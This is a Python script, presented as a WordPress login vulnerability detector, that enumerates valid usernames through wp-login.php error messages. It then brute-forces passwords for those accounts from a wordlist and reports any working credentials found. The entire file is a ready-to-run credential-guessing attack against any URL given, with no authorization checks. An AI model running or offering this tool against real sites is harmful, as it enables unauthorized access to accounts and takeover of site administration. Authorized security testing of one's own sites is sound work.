import requests
import argparse
import json
import time
from typing import List, Dict


# Load lines from a wordlist file
def load_list(file_path: str) -> List[str]:
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]


# Detect user enumeration
def detect_user_enumeration(base_url: str, usernames: List[str], invalid_user_keywords: List[str], session: requests.Session, debug: bool = False) -> (Dict, List[str]):
    endpoint = base_url.rstrip("/") + "/wp-login.php"
    found_users = []

    for username in usernames:
        data = {
            "log": username,
            "pwd": "FakePass!@#",
            "wp-submit": "Log In",
            "redirect_to": base_url,
            "testcookie": "1"
        }

        try:
            resp = session.post(endpoint, data=data, timeout=5)
            is_invalid = any(keyword.lower() in resp.text.lower() for keyword in invalid_user_keywords)
            if debug:
                print(f"[DEBUG] Tested user '{username}' → Invalid? {is_invalid}")
            if not is_invalid:
                found_users.append(username)
        except requests.RequestException as e:
            print(f"[!] Error contacting {endpoint}: {e}")

    result = {
        "type": "User Enumeration",
        "detected": bool(found_users),
        "vector": "/wp-login.php",
        "confidence": "medium" if found_users else "low"
    }

    return result, found_users


# Detect brute-force login
def detect_brute_force(
    base_url: str,
    usernames: List[str],
    passwords: List[str],
    login_fail_indicators: List[str],
    redirect_keywords: List[str],
    delay: float,
    session: requests.Session,
    debug: bool = False
) -> Dict:
    endpoint = base_url.rstrip("/") + "/wp-login.php"
    credentials_found = []

    for username in usernames:
        for password in passwords:
            data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": base_url,
                "testcookie": "1"
            }

            try:
                resp = session.post(endpoint, data=data, timeout=5, allow_redirects=False)
                location = resp.headers.get("Location", "")

                login_failed = any(keyword.lower() in resp.text.lower() for keyword in login_fail_indicators)
                redirected = resp.status_code in [301, 302] and any(key in location for key in redirect_keywords)

                if debug:
                    print(f"[DEBUG] {username}:{password} → Redirect: {location} | Failed: {login_failed} | Success: {redirected or not login_failed}")

                if redirected or not login_failed:
                    credentials_found.append({"username": username, "password": password})
                    break  # Stop further attempts for this username

            except requests.RequestException as e:
                print(f"[!] Error during brute-force attempt: {e}")

            time.sleep(delay)

    return {
        "type": "Brute-force Login",
        "detected": bool(credentials_found),
        "vector": "/wp-login.php",
        "usernames_tested": usernames,
        "credentials_found": credentials_found,
        "confidence": "high" if credentials_found else "low"
    }


# Main function
def main():
    parser = argparse.ArgumentParser(description="Detect WordPress login vulnerabilities")
    parser.add_argument("url", help="Base URL of the WordPress site (e.g., http://localhost/wordpress)")
    parser.add_argument("--usernames", default="usernames.txt", help="Username wordlist file")
    parser.add_argument("--passwords", default="passwords.txt", help="Password wordlist file")
    parser.add_argument("--invalid-user-keywords", nargs="+", default=["invalid username", "user does not exist", "unknown user"])
    parser.add_argument("--login-fail-indicators", nargs="+", default=["incorrect password", "login failed", "wrong password"])
    parser.add_argument("--success-redirect-keywords", nargs="+", default=["wp-admin"])
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between login attempts in seconds")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")

    args = parser.parse_args()

    session = requests.Session()
    base_url = args.url
    usernames = load_list(args.usernames)
    passwords = load_list(args.passwords)

    enum_result, valid_usernames = detect_user_enumeration(
        base_url,
        usernames,
        args.invalid_user_keywords,
        session,
        args.debug
    )

    if enum_result["detected"]:
        brute_result = detect_brute_force(
            base_url,
            valid_usernames,
            passwords,
            args.login_fail_indicators,
            args.success_redirect_keywords,
            args.delay,
            session,
            args.debug
        )
    else:
        brute_result = {
            "type": "Brute-force Login",
            "detected": False,
            "vector": "/wp-login.php",
            "usernames_tested": [],
            "credentials_found": [],
            "confidence": "low"
        }

    # Only include the relevant keys in final JSON output
    output = {
        "target": base_url,
        "vulnerabilities": [
            {
                "type": enum_result["type"],
                "detected": enum_result["detected"],
                "vector": enum_result["vector"],
                "confidence": enum_result["confidence"]
            },
            brute_result
        ]
    }

    try:
        print(json.dumps(output, indent=2))
    except Exception as e:
        print(f"[!] Error printing JSON output: {e}")


if __name__ == "__main__":
    main()